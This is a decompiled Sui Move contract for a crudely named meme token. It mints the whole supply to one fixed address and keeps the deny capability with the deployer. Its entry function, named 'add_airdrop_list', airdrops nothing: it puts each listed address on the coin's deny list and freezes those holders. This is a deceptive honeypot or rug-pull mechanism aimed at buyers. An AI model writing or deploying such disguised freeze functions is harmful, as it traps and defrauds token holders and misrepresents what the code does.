module 0xe3e2a86c905fedb3b19bcd881c2eb49f7e1c4f50f5e2418f6db2bce0e410ba5a::CUM {
    struct CUM has drop {
        dummy_field: bool,
    }

    entry fun add_airdrop_list(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CUM>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        while (v0 < 0x1::vector::length<address>(&mut arg2)) {
            let v1 = 0x1::vector::pop_back<address>(&mut arg2);
            if (!0x2::coin::deny_list_v2_contains_current_epoch<CUM>(arg0, v1, arg3)) {
                0x2::coin::deny_list_v2_add<CUM>(arg0, arg1, v1, arg3);
            };
            v0 = v0 + 1;
        };
    }

    fun init(arg0: CUM, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CUM>(arg0, 6, b"CUM", b"SPERM", b"CUM", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://i.imgur.com/PhXuukh.png"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CUM>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CUM>>(v1, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::Coin<CUM>>(0x2::coin::mint<CUM>(&mut v3, 100000000000000, arg1), @0x7b3c5d549871784c7a9aaf06970698b9c7a7acaf23171d6f1f0de4094176225b);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CUM>>(v3);
    }

    // decompiled from Move bytecode v6
}

